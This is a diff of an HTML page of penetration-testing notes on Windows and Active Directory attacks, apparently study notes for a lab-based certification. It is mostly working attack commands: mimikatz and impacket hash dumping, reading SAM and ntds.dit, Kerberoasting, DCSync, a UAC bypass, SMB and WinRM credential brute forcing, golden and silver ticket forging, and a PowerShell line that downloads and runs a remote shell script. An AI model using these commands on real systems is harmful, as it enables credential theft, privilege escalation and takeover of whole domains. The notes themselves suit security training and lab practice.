-    </ul>
-</ul>
-
-<hr>
-
-<h2>Active Directory</h2>
-
-<li>Authentication</li>
-<ul>
-    <li>NTLM</li>
-    <ul>
-        <li>Used when clients authenticate to a server by IP (instead of hostname) or if a user attempts to authenticate to a hostname that is not registered on the AD DNS server.  3rd party applications can also choose NTLM instead of Kerberos.</li>
-        <li>NTLM hashes can be cracked very quickly</li>
-    </ul>
-    <li>Kerberos</li>
-</ul>
-
-<li>ntds.dit file</li>
-<ul>
-    <li>Database stored on DC that contains all active directory information including password hashes for all users in the domain</li>
-    <li>C:\windows\ntds\</li>
-    <li>Can use SYSTEM file to decrypt the ntds.dit and extract all the information from it</li>
-    <ul>
-        <li>impacket-secretsdump -ntds &lt;ntds.dit file&gt; -system &lt;SYSTEM file&gt; [-security &lt;SECURITY file&gt;] LOCAL</li>
-        <ul>
-            <li>Additional Useful flags:</li>
+            
+            <li>PromptOnSecureDesktop</li>
             <ul>
-                <table>
-                    <tr>
-                        <td>-pwd-last-set</td>
-                        <td>If user has multiple accounts and changes password in same timeframe then likey all passwords are the same </td>
-                    </tr>
-                    <tr>
-                        <td>-user-status</td>
-                        <td>Tells if the account is disabled or not</td>
-                    </tr>
-                    <tr>
-                        <td>-history</td>
-                        <td>Windows will show the last 24 used passwords for each user</td>
-                    </tr>
-                </table>
+                <li>Either 1 or 0</li>
             </ul>
-            <li>Grep the ntds dump</li>
-            <ul>
-                <li>grep -v 'aes[12]\|des-cbc</li>
-                <li>grep -v history0</li>
-            </ul>
+            
+            <li>If ConsentPromptBehaviorAdmin=2 &amp; PromptOnSecureDesktop=1 then UAC bypass will not work</li>
+            <li>If ConsentPromptBehaviorAdmin=5 &amp; PromptOnSecureDesktop=1 then UAC bypass will work</li>
         </ul>
     </ul>
-</ul>
-
-<li>Brute force valid users amd pre-auth attack</li>
-<ul>
-    <li>kerbrute</li>
-    <ul>
-        <li>pre-auth attack tool.  Will validate user existence.</li>
-        <li>Can lock out users but will not generate 4625 event code which is logged by default.  The event code it does generate is not logged by default.</li>
-        <li>kerberute userenum --dc apt -d &lt;domain&gt; &lt;user list&gt;</li>
-    </ul>
-</ul>
-
-<li>Kerberoast</li>
-<ul>
-    <li>Mimikatz/manual</li>
+    
+    <li>ConsentPromptBehaviorAdmin Values:</li>
     <table>
         <tr>
-            <td>Purge all current tickets</td>
-            <td>kerberos::purge</td>
+            <td>Value</td>
+            <td>Meaning</td>
         </tr>
         <tr>
-            <td>Enumerate SPNs</td>
-            <td>GetUserSPNs.ps1</td>
+            <td>0x00000000</td>
+            <td>This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials.</td>
         </tr>
         <tr>
-            <td>Request security token for SPN</td>
+            <td>0x00000001</td>
+            <td>This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.</td>
+        </tr>
+        <tr>
+            <td>0x00000002</td>
+            <td>This option prompts the administrator in Admin Approval Mode to select either &quot;Permit&quot; or &quot;Deny&quot; an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. &quot;Prompt for consent&quot; removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop.</td>
+        </tr>
+        <tr>
+            <td>0x00000003</td>
+            <td>This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege.</td>
+        </tr>
+        <tr>
+            <td>0x00000004</td>
+            <td>This prompts the administrator in Admin Approval Mode to select either &quot;Permit&quot; or &quot;Deny&quot; an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. &quot;Prompt for consent&quot; removes the inconvenience of requiring that users enter their name and password to perform a privileged task.</td>
+        </tr>
+        <tr>
+            <td>0x00000005</td>
+            <td>This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either &quot;Permit&quot; or &quot;Deny&quot; for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.</td>
+        </tr>
+    </table>
+    
+    <li>Eventvwr.exe UAC bypass:</li>
+    <ul>
+        <li>Works on Windows 7, 8, and 10.  Does not work on Vista</li>
+        <li>Guide: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</li>
+        <li>Exploit in C (requires minimal editing) - https://github.com/turbo/zero2hero</li>
+    </ul>
+    
+    <li>Pre-made UAC bypass executables on Kali</li>
+    <ul>
+        <li>bypassuac-x86.exe & bypassuac-x64.exe</li>
+        <li>Same limitations as eventvwr.exe UAC bypass</li>
+        <li>bypassuac-x**.exe /c C:\directory\to\shell4444.exe</li>
+    </ul>
+    
+    <hr>
+    
+    <h2>Finding Logged in Users</h2>
+    
+    <li>Enumerate Logged on Users</li>
+    <ul>
+        <li>Individual Workstation</li>
+        <ul>
+            <li>NetWkstaUserEnum</li>
+            <ul>
+                <li>Requires admin privileges</li>
+            </ul>
+            
+            <li>Powerview.ps1</li>
+            <ul>
+                <li>Get-NetLoggedon –ComputerName &lt;workstation name&gt;</li>
+            </ul>
+        </ul>
+        
+        <li>Domain Enumeration</li>
+        <ul>
+            <li>NetSessionEnum</li>
+            <ul>
+                <li>Enumerate active sessions on domain joined machines</li>
+                <li>Does not require admin privileges</li>
+                <li>Use against file servers and domain controllers</li>
+                <li>Powerview.ps1</li>
+                <ul>
+                    <li>Get-NetSession</li>
+                    <ul>
+                        <li>Get-NetSession –ComputerName &lt;domain controller or server &ndash; ex. dc01&gt;</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+    
+    <hr>
+    
+    <h2>Security Identifier (SID)</h2>
+    
+    <li>Every account has one.</li>
+    <ul>
+        <li>There is a separate one for each account that is used for elevated privileges (UAC)</li>
+    </ul>
+    
+    <li>Windows refers to accounts by SIDs, people refer to accounts by account names</li>
+    <li>All SIDs start with S-1-5-21</li>
+    <ul>
+        <li>Admin always ends in 500</li>
+        <li>Guest always ends in 501</li>
+        <li>S-1-5-19 is the LocalSystem account</li>
+    </ul>
+    
+    <li>Example SID: S-1-5-21-1180699209-877415012-3182924384-1004</li>
+    <table>
+        <tr>
+            <td>S</td>
+            <td>1</td>
+            <td>5</td>
+            <td>21-1180699209-877415012-3182924384</td>
+            <td>1004</td>
+        </tr>
+        <tr>
+            <td>Indicates this is a SID</td>
+            <td>SID specification version number</td>
+            <td>Identifier authority</td>
+            <td>Domain or local computer identifier</td>
+            <td>Relative ID</td>
+        </tr>
+    </table>
+    
+    <hr>
+    
+    <h2>Dump Hashes</h2>
+    
+    <li>Dumped hash format</li>
+    <ul>
+        <li>Username:#:LM HASH:NTLM HASH:::</li>
+    </ul>
+    
+    <li>SAM, SYSTEM, and SECURITY Location</li>
+    <ul>
+        <li>C:\Windows\System32\config\</li>
+        <li>Backup Locations</li>
+        <ul>
+            <li>C:\Windows\System32\config\RegBack</li>
+            <li>C:\Windows\Repair</li>
+        </ul>
+        <li>reg save HKLM\&lt;file&gt; &lt;Out file&gt;</li>
+    </ul>
+    
+    <li>mimikatz</li>
+    <ul>
+        <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
+        <li>Dump creds/hashes</li>
+        <ul>
+            <li>Summary</li>
+            <ul>
+                <li>privilege::debug</li>
+                <li>token::elevate</li>
+                <li>lsadump::sam</li>
+                <li>sekurlsa::logonpasswords</li>
+            </ul>
+            
+            <li>Explained/Detailed</li>
+            <ul>
+                <li>Mimikatz must be launched from an administrative command prompts</li>
+                <ul>
+                    <li>Must first execute two commands:</li>
+                    <ul>
+                        <li>privilege::debug – enables SeDebugPrivilege</li>
+                        <ul>
+                            <li>If fails, mimikatz was most likely not executed with admin privileges</li>
+                        </ul>
+                        
+                        <li>token::elevate</li>
+                        <ul>
+                            <li>Elevates mimikatz security token from administrator to SYSTEM</li>
+                            <li>If mimikatz is launched from a SYSTEM shell, this step can be skipped</li>
+                        </ul>
+                    </ul>
+                    
+                    <li>Dump SAM contents (Security Account Manager)</li>
+                    <ul>
+                        <li>lsadump::sam</li>
+                    </ul>
+                    
+                    <li>Dump NTLM hash</li>
+                    <ul>
+                        <li>sekurlsa::logonpasswords</li>
+                        <ul>
+                            <li>This will dump the credentials of all users currently logged into the workstation or server.</li>
+                            <ul>
+                                <li>Includes remote logins like RDP sessions</li>
+                            </ul>
+                            
+                            <li>If WDigest is enabled Mimikatz will reveal cleartext passwords alongside hashes (Windows 7)</li>
+                        </ul>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+        
+        <li>ERROR kuhl_m_sekurlsa_acquireLSA; Key import</li>
+        <ul>
+            <li>Newer Windows update makes it so mimikatz versions 2.2.0 and newer do not work.  Must use an older version of mimikatz.</li>
+            <ul>
+                <li>https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/</li>
+            </ul>
+        </ul>
+    </ul>
+    
+    <li>Other tools such as samdump2, pwdump, fgdump, and Windows Credential Editor (wce) work well against older Windows OS's such as XP or Server 2003</li>
+    
+    <li>impacket-secretsdump</li>
+    <ul>
+        <li>Dump hashes locally</li>
+        <ul>
+            <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;] LOCAL</li>
+        </ul>
+    </ul>
+    
+    <hr>
+    
+    <h2>Active Directory</h2>
+    
+    <li>Authentication</li>
+    <ul>
+        <li>NTLM</li>
+        <ul>
+            <li>Used when clients authenticate to a server by IP (instead of hostname) or if a user attempts to authenticate to a hostname that is not registered on the AD DNS server.  3rd party applications can also choose NTLM instead of Kerberos.</li>
+            <li>NTLM hashes can be cracked very quickly</li>
+        </ul>
+        <li>Kerberos</li>
+    </ul>
+    
+    <li>ntds.dit file</li>
+    <ul>
+        <li>Database stored on DC that contains all active directory information including password hashes for all users in the domain</li>
+        <li>C:\windows\ntds\</li>
+        <li>Can use SYSTEM file to decrypt the ntds.dit and extract all the information from it</li>
+        <ul>
+            <li>impacket-secretsdump -ntds &lt;ntds.dit file&gt; -system &lt;SYSTEM file&gt; [-security &lt;SECURITY file&gt;] LOCAL</li>
+            <ul>
+                <li>Additional Useful flags:</li>
+                <ul>
+                    <table>
+                        <tr>
+                            <td>-pwd-last-set</td>
+                            <td>If user has multiple accounts and changes password in same timeframe then likey all passwords are the same </td>
+                        </tr>
+                        <tr>
+                            <td>-user-status</td>
+                            <td>Tells if the account is disabled or not</td>
+                        </tr>
+                        <tr>
+                            <td>-history</td>
+                            <td>Windows will show the last 24 used passwords for each user</td>
+                        </tr>
+                    </table>
+                </ul>
+                
+                <li>Grep the ntds dump</li>
+                <ul>
+                    <li>grep -v &apos;aes[12]\|des-cbc</li>
+                    <li>grep -v history0</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+    
+    <li>Brute force valid users amd pre-auth attack</li>
+    <ul>
+        <li>kerbrute</li>
+        <ul>
+            <li>pre-auth attack tool.  Will validate user existence.</li>
+            <li>Can lock out users but will not generate 4625 event code which is logged by default.  The event code it does generate is not logged by default.</li>
+            <li>kerberute userenum --dc apt -d &lt;domain&gt; &lt;user list&gt;</li>
+        </ul>
+    </ul>
+    
+    <li>Kerberoast</li>
+    <ul>
+        <li>Mimikatz/manual</li>
+        <table>
+            <tr>
+                <td>Purge all current tickets</td>
+                <td>kerberos::purge</td>
+            </tr>
+            <tr>
+                <td>Enumerate SPNs</td>
+                <td>GetUserSPNs.ps1</td>
+            </tr>
+            <tr>
+                <td>Request security token for SPN</td>
+                <td>
+                    <li>Add-Type -AssemblyName System.IdentityModel</li>
+                    <li>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#039;&lt;SPN - Example:HTTP/CorpWebServer.corp.com&gt;'</li>
+                </td>
+            </tr>
+            <tr>
+                <td>export TGS ticket</td>
+                <td>kereberos::list /export or PS &gt; klist</td>
+            </tr>
+            <tr>
+                <td>Turn output into hashcat hash</td>
+                <td>kirbi2hashcat</td>
+            </tr>
+        </table>
+        
+        <li>Rubeus</li>
+        <ul>
+            <li>.\r.exe kerberoast /creduser:domain\&lt;user&gt; /credpassword:&lt;password&gt;</li>
+        </ul>
+        
+        <li>GetUserSPNs.py</li>
+        <table>
+            <tr>
+                <td>Forward port 88 & 389 to Kali</td>
+                <td>chisel.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389</td>
+            </tr>
+            <tr>
+                <td>Get hash for kerberoastable users</td>
+                <td>GetUserSPNs.py -request -dc-ip 127.0.0.1 &lt;domain&gt;/&lt;user&gt;</td>
+            </tr>
+        </table>
+    </ul>
+    
+    <li>DCSync</li>
+    <ul>
+        <li>Retrieve all domain password data via domain replication protocols.</li>
+        <li>Tools/Methods</li>
+        <ul>
+            <li>Impacket-SecretsDump &#039;&lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;&#039;</li>
+            <ul>
+                <li>Attack remotely.  Generates network traffic.  Does not have to deal with AV or other problems on victim machine.</li>
+            </ul>
+            <li>.\Mimikatz.exe 'lsadump::dcsync /domain:&lt;domain name&gt; /user:administrator&#039; exit</li>
+            <ul>
+                <li>Attack locally.  Reduced network traffic.</li>
+            </ul>
+        </ul>
+    </ul>
+    
+    <li>Brute force credentials with smb and winrm</li>
+    <ul>
+        <li>crackmapexec winrm/smb -u &lt;username&gt; -p &lt;password&gt; or -H &lt;hash&gt;</li>
+        <ul>
+            <li>SMB brute forcing can be detected and banned by some AD setups</li>
+        </ul>
+    </ul>
+    
+    <li>Enumerating AD Users and Groups</li>
+    <table>
+        <tr>
+            <td>net user</td>
+            <td>Shows local user accounts</td>
+        </tr>
+        <tr>
+            <td>net user /domain</td>
+            <td>Shows all domain user accounts</td>
+        </tr>
+        <tr>
+            <td>net user &lt;user&gt; /domain</td>
+            <td>Shows all domain user accounts</td>
+        </tr>
+        <tr>
+            <td>net group /domain</td>
+            <td>Shows all groups on the domain</td>
+        </tr>
+    </table>
+    
+    <li>Fix clock skew</li>
+    <ul>
+        <li>Check clock skew</li>
+        <ul>
+            <li>nmap</li>
+            <ul>
+                <li>sudo nmap -p445 -sV -sC &lt;ip address&gt;</li>
+                <li>Look for clock-skew: mean: &lt;value&gt; deviation: &lt;clock skew time&gt; median: &lt;value&gt;</li>
+            </ul>
+        </ul>
+        
+        <li>Check local time (on Kali)</li>
+        <ul>
+            <li>date</li>
+        </ul>
+        
+        <li>Change local time (on Kali)</li>
+        <ul>
+            <li>date -s &lt;Time&gt;</li>
+            <ul>
+                <li>&lt;Time&gt; Format</li>
+                <ul>
+                    <li>HH:MM:SS</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+    
+    <hr>
+    
+    <h2>Credential Usage</h2>
+    
+    <table>
+        <tr>
             <td>
-                <li>Add-Type -AssemblyName System.IdentityModel</li>
-                <li>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#039;&lt;SPN - Example:HTTP/CorpWebServer.corp.com&gt;'</li>
+                <li>impacket-psexec</li>
+                <ul>
+                    <li>If user has ability to write to a SMB share</li>
+                </ul>
+                <li>impacket-wmiexec uses same syntax</li>
+                <ul>
+                    <li>wmiexec does not require writing to SMB</li>
+                </ul>
+            </td>
+            <td>
+                <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt; -hashes LM:NTLM</li>
+                <li>impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;</li>
+                <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt;</li>
+                <ul>
+                    <li>Will prompt for password.  Works when password has bad characters that are throwing off the command.</li>
+                </ul>
             </td>
         </tr>
         <tr>
-            <td>export TGS ticket</td>
-            <td>kereberos::list /export or PS > klist</td>
-        </tr>
-        <tr>
-            <td>Turn output into hashcat hash</td>
-            <td>kirbi2hashcat</td>
-        </tr>
-    </table>
-    <li>Rubeus</li>
-    <ul>
-        <li>.\r.exe kerberoast /creduser:domain\&lt;user&gt; /credpassword:&lt;password&gt;</li>
-    </ul>
-    <li>GetUserSPNs.py</li>
-    <table>
-        <tr>
-            <td>Forward port 88 & 389 to Kali</td>
-            <td>chisel.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389</td>
-        </tr>
-        <tr>
-            <td>Get hash for kerberoastable users</td>
-            <td>GetUserSPNs.py -request -dc-ip 127.0.0.1 &lt;domain&gt;/&lt;user&gt;</td>
-        </tr>
-    </table>
-</ul>
-
-<li>DCSync</li>
-<ul>
-    <li>Retrieve all domain password data via domain replication protocols.</li>
-    <li>Tools/Methods</li>
-    <ul>
-        <li>Impacket-SecretsDump &#039;&lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;&#039;</li>
-        <ul>
-            <li>Attack remotely.  Generates network traffic.  Does not have to deal with AV or other problems on victim machine.</li>
-        </ul>
-        <li>.\Mimikatz.exe 'lsadump::dcsync /domain:&lt;domain name&gt; /user:administrator&#039; exit</li>
-        <ul>
-            <li>Attack locally.  Reduced network traffic.</li>
-        </ul>
-    </ul>
-</ul>
-
-<li>Brute force credentials with smb and winrm</li>
-<ul>
-    <li>crackmapexec winrm/smb -u &lt;username&gt; -p &lt;password&gt; or -H &lt;hash&gt;</li>
-    <ul>
-        <li>SMB brute forcing can be detected and banned by some AD setups</li>
-    </ul>
-</ul>
-
-<li>Enumerating AD Users and Groups</li>
-<table>
-    <tr>
-        <td>net user</td>
-        <td>Shows local user accounts</td>
-    </tr>
-    <tr>
-        <td>net user /domain</td>
-        <td>Shows all domain user accounts</td>
-    </tr>
-    <tr>
-        <td>net user &lt;user&gt; /domain</td>
-        <td>Shows all domain user accounts</td>
-    </tr>
-    <tr>
-        <td>net group /domain</td>
-        <td>Shows all groups on the domain</td>
-    </tr>
-</table>
-
-<li>Fix clock skew</li>
-<ul>
-    <li>Check clock skew</li>
-    <ul>
-        <li>nmap</li>
-        <ul>
-            <li>sudo nmap -p445 -sV -sC &lt;ip address&gt;</li>
-            <li>Look for clock-skew: mean: &lt;value&gt; deviation: &lt;clock skew time&gt; median: &lt;value&gt;</li>
-        </ul>
-    </ul>
-    <li>Check local time (on Kali)</li>
-    <ul>
-        <li>date</li>
-    </ul>
-    <li>Change local time (on Kali)</li>
-    <ul>
-        <li>date -s &lt;Time&gt;</li>
-        <ul>
-            <li>&lt;Time&gt; Format</li>
-            <ul>
-                <li>HH:MM:SS</li>
-            </ul>
-        </ul>
-    </ul>
-</ul>
-
-<hr>
-
-<h2>Credential Usage</h2>
-
-<table>
-    <tr>
-        <td>
-            <li>impacket-psexec</li>
-            <ul>
-                <li>If user has ability to write to a SMB share</li>
-            </ul>
-            <li>impacket-wmiexec uses same syntax</li>
-            <ul>
-                <li>wmiexec does not require writing to SMB</li>
-            </ul>
-        </td>
-        <td>
-            <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt; -hashes LM:NTLM</li>
-            <li>impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;ip address&gt;</li>
-            <li>impacket-psexec &lt;username&gt;@&lt;ip address&gt;</li>
-            <ul>
-                <li>Will prompt for password.  Works when password has bad characters that are throwing off the command.</li>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <li>Run powershell command as other user</li>
-        </td>
-        <td>
-            <table>
-                <tr>
-                    <td>Method 1</td>
-                    <td>Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://<ip address>/shell.ps1')" -Credential $cred</td>
+            <td>
+                <li>Run powershell command as other user</li>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://&lt;ip address&gt;/shell.ps1&apos;)&quot; -Credential $cred</td>
                     </tr>
                     <tr>
                         <td>Method 2</td>
@@ -1733,6 +1840,7 @@ layout: default
                 <li>Sekurlsa::logonpasswords</li>
             </ul>
         </ul>
+        
         <li>Authenticate with NTLM hash – Powershell session under context of other user</li>
         <ul>
             <li>Mimikatz</li>
@@ -1768,16 +1876,19 @@ layout: default
                 <li>SID is everything except the last section of digits</li>
             </ul>
         </ul>
+        
         <li>mimikatz</li>
         <ul>
             <li>Get rid of pre-existing kerberos tickets</li>
             <ul>
                 <li>Kerberos::purge</li>
             </ul>
+            
             <li>Verify Kerberos tickets are purged</li>
             <ul>
                 <li>Kerberos::list</li>
             </ul>
+            
             <li>Forge silver ticket</li>
             <ul>
                 <li>Kerberos::golden /user:&lt;username&gt; /domain:&lt;domain ex. corp.com&gt; /sid:&lt;domain SID &ndash; whoami /user SID except last section of #&#039;s&gt; target:&lt;fully qualified host name of service &ndash; ex. CorpWebServer.corp.com&gt; /service:&lt;service type &ndash; ex. HTTP&gt; /rc4:&lt;service account hash&gt; /ppt (inject into memory)</li>
@@ -1806,19 +1917,18 @@ layout: default
         <ul>
             <li>impacket-SecretsDump</li>
         </ul>
+
         <li>Get domain SID</li>
         <ul>
             <li>On Windows</li>
             <ul>
-                <li>PS > Get-ADDomain &lt;Domain&gt;</li>
+                <li>PS &gt; Get-ADDomain &lt;Domain&gt;</li>
             </ul>
         </ul>
+
         <li>impacket-ticketer</li>
         <ul>
             <li>impacket-ticketer -nthash &lt;krbtgt ntlm hash&gt; -domain-sid &lt;domain sid&gt; -domain &lt;Domain Name&gt; &lt;Username&gt;</li>
-            <ul>
-                <li></li>
-            </ul>
         </ul>
         <li>export KRB5CCNAME=&lt;output .cache file from impacket-ticketer command&gt;</li>
         <li>psexec &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; -k -no-pass</li>
@@ -1827,6 +1937,7 @@ layout: default
             <ul>
                 <li>Try DNS names instead of ip address in command</li>
             </ul>
+
             <li>psexec will always login as SYSTEM</li>
             <ul>
                 <li>switch to wmiexec to login as Administrator instead of SYSTEM</li>
@@ -1841,18 +1952,22 @@ layout: default
             <li>mimikatz: privilege::debug</li>
             <li>mimikatz: lsadump::lsa /patch</li>
         </ul>
+
         <li>Purge kerberos tickets</li>
         <ul>
             <li>mimikatz: kerberos::purge</li>
         </ul>
+
         <li>Create golden ticket</li>
         <ul>
             <li>mimikatz: kerberos::golden /user:fakeuser /domain:corp.com /sid:s-1-5-&lt;sid&gt; /krbtgt:&lt;krbtgt hash /ptt&gt;</li>
         </ul>
+
         <li>Launch new command prompt</li>
         <ul>
             <li>misc::cmd</li>
         </ul>
+        
         <li>Attempt lateral movement with psexec</li>
         <ul>
             <li>Psexec.exe \\&lt;domain controller&gt; cmd.exe</li>
